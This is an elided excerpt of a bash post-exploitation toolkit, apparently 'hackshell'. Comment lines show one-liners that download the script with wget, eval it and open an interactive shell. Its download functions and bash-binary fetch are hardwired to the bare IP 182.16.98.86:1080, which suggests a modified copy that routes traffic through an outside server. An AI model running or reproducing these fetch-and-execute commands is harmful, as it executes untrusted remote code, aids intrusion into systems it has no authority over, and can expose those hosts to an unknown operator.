...
#     eval  "$(wget -qO-  https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"; exec bash -i
#     bash -c "(eval \"$(wget -qO-  https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)\"); exec bash -i"
#     bash -c "(eval \"$(wget -qO-  https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)\"); exec bash -i"
#     bash -c "(eval \"$(wget -qO-  https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)\"); exec bash -i"
...
hs_init_dl() {
    ...
    if which curl &>/dev/null; then
        ...
        dl() { 
            local opts=()
            [ -n "$UNSAFE" ] && opts=("-k")
            curl -fsSL "${opts[@]}" --connect-timeout 7 --retry 2 "http://182.16.98.86:1080/${1:?}"
        }
        ...
        dl() {
            ...
            wget -O- "${opts[@]}" "${_HS_WGET_OPTS[@]}" "http://182.16.98.86:1080/${1:?}"
        }
    elif [ -n "$HS_PY" ]; then
        dl() { purl "$@"; }
...
hs_init() {
    ...
    _hs_init_rootfs
    [ -z "$BASH" ] && {
        str="http://182.16.98.86:1080/https://bin.pkgforge.dev/${HS_ARCH}/bash"
